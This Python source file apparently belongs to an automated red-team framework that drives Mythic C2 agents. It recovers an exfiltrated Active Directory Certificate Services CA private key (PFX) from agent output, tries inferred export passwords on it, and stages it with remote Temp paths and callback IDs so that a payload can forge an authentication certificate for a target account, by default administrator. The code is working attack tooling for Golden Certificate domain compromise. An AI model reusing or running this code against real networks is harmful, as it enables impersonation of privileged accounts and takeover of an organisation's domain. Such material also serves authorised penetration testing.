"""Runtime materialization for ADCS certificate-auth capabilities.

The capability layer is intentionally payload-agnostic: it says "use verified CA
signing material to obtain certificate-authenticated access", not how a given
Mythic agent should stage files. This module handles only the deterministic local
artifact resolution step shared by Mythic backends: resolve a verified CA PFX from
the durable ledger and return builder-ready staging inputs. The target account
certificate must be forged by a Mythic-tasked payload adapter, never by Sage.
"""

from __future__ import annotations

import base64
from dataclasses import dataclass, field
import hashlib
import os
from pathlib import Path
import re
from typing import Any


@dataclass
class CertificateAuthMaterialization:
    ok: bool
    inputs: dict[str, Any] = field(default_factory=dict)
    evidence: dict[str, Any] = field(default_factory=dict)
    missing: list[str] = field(default_factory=list)
    reason: str = ""


KEY_RE = re.compile(
    rb"-----BEGIN (?:RSA |EC |DSA |)PRIVATE KEY-----[\s\S]+?-----END (?:RSA |EC |DSA |)PRIVATE KEY-----",
    re.IGNORECASE,
)
CERT_RE = re.compile(rb"-----BEGIN CERTIFICATE-----[\s\S]+?-----END CERTIFICATE-----", re.IGNORECASE)

_CA_ARTIFACT_KEYS = (
    "pfx_artifact_path",
    "ca_pfx_artifact_path",
    "ca_artifact_path",
    "artifact_path",
    "local_artifact_path",
    "private_key_artifact_path",
)


def persist_verified_ca_pfx_artifact(
    output: Any,
    artifact_dir: str | os.PathLike[str],
    *,
    engagement_key: str,
    ca_host: str,
    domain: str,
) -> dict[str, str]:
    """Persist one raw Mythic-exported CA PFX before the probe is redacted.

    The durable probe intentionally does not retain ``PFX_BASE64``. This helper is
    the one allowed handoff point from raw task output to a local artifact: it
    validates the blob, verifies any declared SHA256, writes a deterministic file,
    and returns only non-secret provenance fields for the ledger.
    """

    pfx_base64 = _output_field(output, "PFX_BASE64")
    if not pfx_base64:
        return {}
    try:
        blob = base64.b64decode(re.sub(r"\s+", "", pfx_base64), validate=True)
    except Exception:
        return {}
    if len(blob) < 256 or blob[:1] != b"0":
        return {}
    sha256 = hashlib.sha256(blob).hexdigest()
    declared_sha256 = _output_field(output, "PFX_SHA256").casefold()
    if declared_sha256 and declared_sha256 != sha256:
        return {}

    artifact_root = Path(artifact_dir)
    artifact_root.mkdir(parents=True, exist_ok=True)
    slug = _slug("_".join(
        part for part in (engagement_key, _host_short(ca_host), _normalize(domain), sha256[:16]) if part
    ))
    path = artifact_root / f"adcs_ca_signing_{slug}.pfx"
    if not path.is_file() or hashlib.sha256(path.read_bytes()).hexdigest() != sha256:
        path.write_bytes(blob)
    return {
        "pfx_artifact_path": str(path),
        "pfx_artifact_sha256": sha256,
        "pfx_sha256": sha256,
    }


def materialize_adcs_certificate_auth(
    *,
    ledger: dict[str, Any],
    artifact_dir: str | os.PathLike[str],
    engagement_key: str,
    domain: str,
    account: str,
    ca_host: str,
    callback_id: str,
    account_sid: str = "",
    sid_extension_encoding: str = "utf8",
    ca_pfx_password: str = "",
    forged_pfx_password: str = "",
    remote_ca_pfx_path: str = "",
    remote_forged_pfx_path: str = "",
) -> CertificateAuthMaterialization:
    """Resolve a verified CA PFX for payload-side certificate forging.

    A CA artifact is accepted only when the ledger has an achieved
    ``adcs-ca-private-key:<ca>@<domain>`` effect. The artifact directory is used
    as a path resolver for that verified fact, not as independent proof. Sage does
    not use the CA private key to forge the target certificate itself.
    """

    domain = _normalize(domain)
    account = _normalize(account) or "administrator"
    ca_host = _host_short(ca_host)
    callback_id = _normalize_callback(callback_id)
    missing = []
    if not domain:
        missing.append("domain")
    if not account:
        missing.append("account")
    if not ca_host:
        missing.append("ca_host")
    if not callback_id:
        missing.append("callback_id")
    if missing:
        return CertificateAuthMaterialization(False, missing=missing, reason="missing certificate-auth materialization input")

    slug = _slug("_".join(part for part in (account, domain, callback_id) if part))
    try:
        from . import capabilities as _caps
    except ImportError:
        import capabilities as _caps
    # Per-run, non-source-visible artifact passwords. CA export uses SagePfx plus an export-context slug;
    # certificate auth may run later with only ledger evidence, so try inferred export passwords and skip
    # artifacts that cannot actually be opened instead of selecting by filename alone.
    ca_pfx_passwords = _ca_pfx_password_values(
        ledger,
        ca_host=ca_host,
        domain=domain,
        current_callback_id=callback_id,
        certificate_slug=slug,
        explicit_password=ca_pfx_password,
        caps_module=_caps,
    )
    forged_pfx_password = forged_pfx_password or _caps.artifact_secret("SageCert", slug)
    remote_ca_pfx_path = remote_ca_pfx_path or f"C:\\Windows\\Temp\\sage_ca_signing_{slug}.pfx"
    remote_forged_pfx_path = remote_forged_pfx_path or f"C:\\Windows\\Temp\\sage_forged_cert_{slug}.pfx"
    subject_hint = f"{domain.split('.', 1)[0]}-ca"

    artifact_root = Path(artifact_dir)
    ca_artifact, ca_hop, selected_ca_pfx_password = resolve_verified_ca_pfx_artifact(
        ledger,
        artifact_root,
        ca_host,
        domain,
        ca_pfx_password=ca_pfx_passwords,
        subject_hint=subject_hint,
        engagement_key=engagement_key,
    )
    if not ca_artifact:
        usable_artifact, _ = resolve_verified_ca_artifact(
            ledger,
            artifact_root,
            ca_host,
            domain,
            ca_pfx_password=ca_pfx_passwords,
            subject_hint=subject_hint,
            engagement_key=engagement_key,
        )
        if usable_artifact:
            return CertificateAuthMaterialization(
                False,
                missing=["adcs_ca_private_key_pfx_artifact"],
                reason=(
                    "verified CA private-key material exists, but the payload-side certificate forge "
                    "adapter requires a usable PFX artifact"
                ),
            )
        return CertificateAuthMaterialization(
            False,
            missing=["adcs_ca_private_key_artifact"],
            reason=f"no verified usable CA private-key PFX artifact for {ca_host}@{domain}",
        )

    try:
        _ca_key, _ca_cert, ca_subject = load_ca_key_cert_from_artifact(
            ca_artifact,
            selected_ca_pfx_password,
            subject_hint,
        )
    except Exception as exc:
        return CertificateAuthMaterialization(
            False,
            missing=["adcs_ca_private_key_artifact"],
            reason=f"verified CA PFX could not be used for payload-side certificate auth: {exc}",
        )
    ca_artifact_sha256 = hashlib.sha256(ca_artifact.read_bytes()).hexdigest()

    inputs = {
        "domain": domain,
        "target_domain": domain,
        "account": account,
        "ca_host": ca_host,
        "callback_id": callback_id,
        "ca_pfx_path": remote_ca_pfx_path,
        "ca_pfx_password": selected_ca_pfx_password,
        "forged_pfx_path": remote_forged_pfx_path,
        "forged_pfx_password": forged_pfx_password,
        "_local_ca_pfx_path": str(ca_artifact),
    }
    if account_sid:
        inputs["account_sid"] = account_sid
    evidence = {
        "source": "adcs_certificate_materializer",
        "materialization_mode": "stage-ca-pfx-for-payload-forge",
        "ca_host": ca_host,
        "domain": domain,
        "account": account,
        "account_sid": account_sid,
        "sid_extension_encoding": sid_extension_encoding,
        "callback_id": callback_id,
        "ca_subject": ca_subject,
        "ca_artifact_path": str(ca_artifact),
        "ca_artifact_sha256": ca_artifact_sha256,
        "remote_ca_pfx_path": remote_ca_pfx_path,
        "remote_forged_pfx_path": remote_forged_pfx_path,
        "verified_effect": _ca_effect(ca_host, domain),
        "verified_hop_id": str(ca_hop.get("id") or ""),
    }
    return CertificateAuthMaterialization(
        True,
        inputs=inputs,
        evidence=evidence,
        reason="materialized verified CA PFX for payload-side certificate forge",
    )


def resolve_verified_ca_pfx_artifact(
    ledger: dict[str, Any],
    artifact_dir: Path,
    ca_host: str,
    domain: str,
    ca_pfx_password: str | list[str] | tuple[str, ...] | set[str] = "",
    subject_hint: str = "",
    engagement_key: str = "",
) -> tuple[Path | None, dict[str, Any], str]:
    """Return a verified CA PFX plus the exact password required by payload tooling."""
    ca_host = _host_short(ca_host)
    domain = _normalize(domain)
    effect = _ca_effect(ca_host, domain)
    for hop in reversed(list(ledger.get("hops") or [])):
        if not isinstance(hop, dict):
            continue
        if str(hop.get("status") or "").casefold() != "achieved":
            continue
        effects = {str(hop.get("effect") or "").casefold()}
        effects.update(str(item or "").casefold() for item in hop.get("satisfied_effects") or [])
        if effect not in effects:
            continue
        evidence = hop.get("evidence") if isinstance(hop.get("evidence"), dict) else {}
        candidates, expected_sha256, provenance_present = _verified_artifact_candidates(
            evidence,
            artifact_dir,
            engagement_key,
            ca_host,
            domain,
        )
        if provenance_present and expected_sha256 is None:
            return None, hop, ""
        for path in _dedupe_paths(candidates):
            if not path.is_file() or path.suffix.casefold() != ".pfx":
                continue
            if expected_sha256 and _file_sha256(path) != expected_sha256:
                continue
            usable, selected_password = _usable_ca_pfx_password(path, ca_pfx_password, subject_hint)
            if usable:
                return path, hop, selected_password
        return None, hop, ""
    return None, {}, ""


def resolve_verified_ca_artifact(
    ledger: dict[str, Any],
    artifact_dir: Path,
    ca_host: str,
    domain: str,
    ca_pfx_password: str | list[str] | tuple[str, ...] | set[str] = "",
    subject_hint: str = "",
    engagement_key: str = "",
) -> tuple[Path | None, dict[str, Any]]:
    ca_host = _host_short(ca_host)
    domain = _normalize(domain)
    effect = _ca_effect(ca_host, domain)
    for hop in reversed(list(ledger.get("hops") or [])):
        if not isinstance(hop, dict):
            continue
        if str(hop.get("status") or "").casefold() != "achieved":
            continue
        effects = {str(hop.get("effect") or "").casefold()}
        effects.update(str(item or "").casefold() for item in hop.get("satisfied_effects") or [])
        if effect not in effects:
            continue
        evidence = hop.get("evidence") if isinstance(hop.get("evidence"), dict) else {}
        candidates, expected_sha256, provenance_present = _verified_artifact_candidates(
            evidence,
            artifact_dir,
            engagement_key,
            ca_host,
            domain,
        )
        if provenance_present and expected_sha256 is None:
            return None, hop
        for path in _dedupe_paths(candidates):
            if not path.is_file():
                continue
            if expected_sha256 and _file_sha256(path) != expected_sha256:
                continue
            if subject_hint:
                try:
                    load_ca_key_cert_from_artifact(path, ca_pfx_password, subject_hint)
                except Exception:
                    continue
            return path, hop
        return None, hop
    return None, {}


def latest_ca_artifact(artifact_dir: Path, ca_host: str, domain: str) -> Path | None:
    candidates = ca_artifact_candidates(artifact_dir, ca_host, domain)
    return candidates[0] if candidates else None


def ca_artifact_candidates(
    artifact_dir: Path,
    ca_host: str,
    domain: str,
    *,
    engagement_key: str = "",
) -> list[Path]:
    ca_host = _host_short(ca_host)
    domain = _normalize(domain)
    if not artifact_dir.is_dir():
        return []
    engagement_slug = _slug(engagement_key) if engagement_key else ""
    candidates = [
        path for path in artifact_dir.glob("adcs_ca_*")
        if ca_host in path.name.casefold()
        and domain in path.name.casefold()
        and path.suffix.casefold() in {".pfx", ".txt", ".pem", ".cer", ".crt"}
    ]
    candidates.sort(
        key=lambda path: (
            bool(engagement_slug and engagement_slug in path.name.casefold()),
            path.stat().st_mtime,
        ),
        reverse=True,
    )
    return candidates


def load_ca_key_cert_from_artifact(
    artifact: Path,
    pfx_password: str | list[str] | tuple[str, ...] | set[str],
    subject_hint: str,
):
    from cryptography import x509
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.serialization import pkcs12

    data = artifact.read_bytes()
    if artifact.suffix.casefold() == ".pfx":
        errors = []
        for password in _pfx_password_candidates(pfx_password):
            try:
                key, cert, _cas = pkcs12.load_key_and_certificates(data, password)
                if key is None or cert is None:
                    raise ValueError("PFX does not contain a private key/certificate pair")
                return key, cert, cert.subject.rfc4514_string()
            except Exception as exc:
                errors.append(str(exc))
        raise ValueError(f"{artifact} could not be opened as a CA PFX: {'; '.join(errors[-2:])}")

    keys = [(match.start(), match.group(0)) for match in KEY_RE.finditer(data)]
    certs = [(match.start(), match.group(0)) for match in CERT_RE.finditer(data)]
    if not keys or not certs:
        raise ValueError(f"{artifact} does not contain PEM private key and certificate material")

    candidates = []
    for cert_pos, cert_pem in certs:
        cert = x509.load_pem_x509_certificate(cert_pem)
        subject = cert.subject.rfc4514_string()
        issuer = cert.issuer.rfc4514_string()
        is_ca = issuer == subject
        try:
            is_ca = bool(cert.extensions.get_extension_for_class(x509.BasicConstraints).value.ca or is_ca)
        except Exception:
            pass
        preceding = [(pos, pem) for pos, pem in keys if pos < cert_pos]
        if not preceding:
            continue
        key = serialization.load_pem_private_key(preceding[-1][1], password=None)
        try:
            key_matches = _public_key_bytes(key) == cert.public_key().public_bytes(
                serialization.Encoding.DER,
                serialization.PublicFormat.SubjectPublicKeyInfo,
            )
        except Exception:
            key_matches = False
        if not key_matches:
            continue
        score = 0
        if is_ca:
            score += 10
        if subject_hint and subject_hint.casefold() in subject.casefold():
            score += 5
        if "ca" in subject.casefold():
            score += 1
        candidates.append((score, subject, key, cert))
    if not candidates:
        raise ValueError(f"{artifact} did not contain a matching CA private key/certificate pair")
    candidates.sort(key=lambda item: item[0], reverse=True)
    _score, subject, key, cert = candidates[0]
    return key, cert, subject


def _candidate_paths(evidence: dict[str, Any]) -> list[Path]:
    paths = []
    for source in _evidence_sources(evidence):
        for key in _CA_ARTIFACT_KEYS:
            text = str(source.get(key) or "").strip()
            if text:
                paths.append(Path(text))
    return paths


def _verified_artifact_candidates(
    evidence: dict[str, Any],
    artifact_dir: Path,
    engagement_key: str,
    ca_host: str,
    domain: str,
) -> tuple[list[Path], str | None, bool]:
    """Return candidates scoped to the achieved hop's own artifact provenance.

    New export hops carry an artifact path plus SHA256. Once a SHA is present,
    directory search is allowed only as a SHA-bound lookup; an unrelated older
    run's PFX cannot satisfy the hop. Path-only current provenance fails closed if
    the path is missing. Legacy hops with no artifact provenance at all retain the
    old directory fallback so retained historical ledgers remain usable where
    possible.
    """

    candidates = []
    candidates.extend(_candidate_paths(evidence))
    candidates.extend(_embedded_pfx_candidate_paths(evidence, artifact_dir, engagement_key, ca_host, domain))
    expected_sha256, sha_field_present = _expected_pfx_sha256(evidence)
    provenance_present = bool(candidates or sha_field_present)
    if expected_sha256 or not provenance_present:
        candidates.extend(ca_artifact_candidates(artifact_dir, ca_host, domain, engagement_key=engagement_key))
    return candidates, expected_sha256, provenance_present


def _expected_pfx_sha256(evidence: dict[str, Any]) -> tuple[str | None, bool]:
    for source in _evidence_sources(evidence):
        for key in ("pfx_artifact_sha256", "pfx_sha256", "ca_pfx_sha256", "PFX_SHA256"):
            value = source.get(key) if isinstance(source, dict) else None
            if value is None:
                continue
            text = str(value).strip().casefold()
            if re.fullmatch(r"[0-9a-f]{64}", text):
                return text, True
            return None, True
    return "", False


def _embedded_pfx_candidate_paths(
    evidence: dict[str, Any],
    artifact_dir: Path,
    engagement_key: str,
    ca_host: str,
    domain: str,
) -> list[Path]:
    paths = []
    for source in _evidence_sources(evidence):
        b64 = _first_text(source, "pfx_base64", "ca_pfx_base64", "PFX_BASE64")
        if not b64:
            continue
        try:
            blob = base64.b64decode(re.sub(r"\s+", "", b64), validate=True)
        except Exception:
            continue
        if len(blob) < 256 or blob[:1] != b"0":
            continue
        expected_sha = _first_text(source, "pfx_sha256", "ca_pfx_sha256", "PFX_SHA256").casefold()
        sha = hashlib.sha256(blob).hexdigest()
        if expected_sha and expected_sha != sha:
            continue
        artifact_dir.mkdir(parents=True, exist_ok=True)
        slug = _slug("_".join(part for part in (engagement_key, ca_host, domain, sha[:16]) if part))
        path = artifact_dir / f"adcs_ca_signing_{slug}.pfx"
        if not path.is_file() or hashlib.sha256(path.read_bytes()).hexdigest() != sha:
            path.write_bytes(blob)
        paths.append(path)
    return paths


def _output_field(output: Any, field: str) -> str:
    if output is None:
        return ""
    text = output.decode(errors="replace") if isinstance(output, bytes) else str(output)
    text = text.replace("\\r\\n", "\n").replace("\\n", "\n").replace("\\r", "\n")
    pattern = re.compile(rf"(?im)^\s*{re.escape(field)}\s*[:=]\s*(.*?)\s*$")
    for match in pattern.finditer(text):
        value = match.group(1).strip().strip("'\"")
        if value:
            return value
    return ""


def _file_sha256(path: Path) -> str:
    try:
        return hashlib.sha256(path.read_bytes()).hexdigest()
    except Exception:
        return ""


def _evidence_sources(evidence: dict[str, Any]) -> list[dict[str, Any]]:
    sources = [evidence] if isinstance(evidence, dict) else []
    for key in ("probe", "verification", "materialized", "artifact", "artifacts"):
        value = evidence.get(key) if isinstance(evidence, dict) else None
        if isinstance(value, dict):
            sources.append(value)
    return sources


def _first_text(source: dict[str, Any], *keys: str) -> str:
    for key in keys:
        value = source.get(key) if isinstance(source, dict) else None
        if value is None:
            continue
        text = str(value).strip()
        if text:
            return text
    return ""


def _dedupe_paths(paths: list[Path]) -> list[Path]:
    out = []
    seen = set()
    for path in paths:
        key = str(path)
        if key in seen:
            continue
        seen.add(key)
        out.append(path)
    return out


def _public_key_bytes(value: Any) -> bytes:
    from cryptography.hazmat.primitives import serialization

    return value.public_key().public_bytes(
        serialization.Encoding.DER,
        serialization.PublicFormat.SubjectPublicKeyInfo,
    )


def _usable_ca_pfx_password(
    artifact: Path,
    pfx_password: str | list[str] | tuple[str, ...] | set[str],
    subject_hint: str,
) -> tuple[bool, str]:
    from cryptography.hazmat.primitives.serialization import pkcs12

    try:
        data = artifact.read_bytes()
    except Exception:
        return False, ""
    for password_text in _pfx_password_text_candidates(pfx_password):
        password = password_text.encode() if password_text else None
        try:
            key, cert, _cas = pkcs12.load_key_and_certificates(data, password)
        except Exception:
            continue
        if key is None or cert is None:
            continue
        if subject_hint and subject_hint.casefold() not in cert.subject.rfc4514_string().casefold():
            continue
        return True, password_text
    return False, ""


def _ca_pfx_password_values(
    ledger: dict[str, Any],
    *,
    ca_host: str,
    domain: str,
    current_callback_id: str,
    certificate_slug: str,
    explicit_password: str,
    caps_module: Any,
) -> list[str]:
    values: list[str] = []

    def add(value: Any) -> None:
        text = str(value or "").strip()
        if text and text not in values:
            values.append(text)

    add(explicit_password)
    add(os.environ.get("SAGE_ADCS_CA_PFX_PASSWORD"))
    effect = _ca_effect(ca_host, domain)
    for hop in reversed(list(ledger.get("hops") or [])):
        if not isinstance(hop, dict):
            continue
        effects = {str(hop.get("effect") or "").casefold()}
        effects.update(str(item or "").casefold() for item in hop.get("satisfied_effects") or [])
        if effect not in effects:
            continue
        for callback_id in _hop_callback_ids(hop):
            add(caps_module.artifact_secret("SagePfx", _slug("_".join(part for part in (ca_host, callback_id) if part))))
        break
    add(caps_module.artifact_secret("SagePfx", _slug("_".join(part for part in (ca_host, current_callback_id) if part))))
    add(caps_module.artifact_secret("SagePfx", _slug(ca_host)))
    # Backward-compatible candidates for older exported artifacts and prior materializer defaults.
    add(caps_module.artifact_secret("SageCA", certificate_slug))
    add(caps_module.artifact_secret("SageCA"))
    return values


def _hop_callback_ids(hop: dict[str, Any]) -> list[str]:
    ids: list[str] = []

    def add(value: Any) -> None:
        callback_id = _normalize_callback(value)
        if callback_id and callback_id not in ids:
            ids.append(callback_id)

    add(hop.get("callback_id") or hop.get("callback"))
    for match in re.findall(r"(?:^|[;:_-])callback=?((?:cb)?\d+)", str(hop.get("id") or ""), re.IGNORECASE):
        add(match)
    evidence = hop.get("evidence") if isinstance(hop.get("evidence"), dict) else {}
    for source in _evidence_sources(evidence):
        add(source.get("callback_id") or source.get("callback") or source.get("callback_display_id"))
    return ids


def _pfx_password_candidates(value: str | list[str] | tuple[str, ...] | set[str]) -> list[bytes | None]:
    out: list[bytes | None] = []
    values = list(value) if isinstance(value, (list, tuple, set)) else [value]
    for item in values:
        text = str(item or "").strip()
        if text:
            out.append(text.encode())
    out.extend([b"", None])
    deduped: list[bytes | None] = []
    for item in out:
        if item not in deduped:
            deduped.append(item)
    return deduped


def _pfx_password_text_candidates(value: str | list[str] | tuple[str, ...] | set[str]) -> list[str]:
    out: list[str] = []
    values = list(value) if isinstance(value, (list, tuple, set)) else [value]
    for item in values:
        text = str(item or "").strip()
        if text and text not in out:
            out.append(text)
    if "" not in out:
        out.append("")
    return out


def _ca_effect(ca_host: str, domain: str) -> str:
    return f"adcs-ca-private-key:{_host_short(ca_host)}@{_normalize(domain)}"


def _host_short(value: Any) -> str:
    text = _normalize(value).strip("\\/")
    if "/" in text and not text.startswith("\\\\"):
        _, _, text = text.partition("/")
    if "@" in text:
        text = text.split("@", 1)[0]
    if text.endswith("$"):
        text = text[:-1]
    return text.split(".", 1)[0].strip()


def _normalize_callback(value: Any) -> str:
    text = _normalize(value)
    if text.startswith("cb") and text[2:].isdigit():
        return text[2:]
    return text if text.isdigit() else ""


def _normalize(value: Any) -> str:
    if value is None:
        return ""
    return " ".join(str(value).strip().casefold().split())


def _slug(value: Any) -> str:
    text = re.sub(r"[^a-zA-Z0-9]+", "_", str(value or "").strip().lower())
    text = re.sub(r"_+", "_", text).strip("_")
    return text or "target"
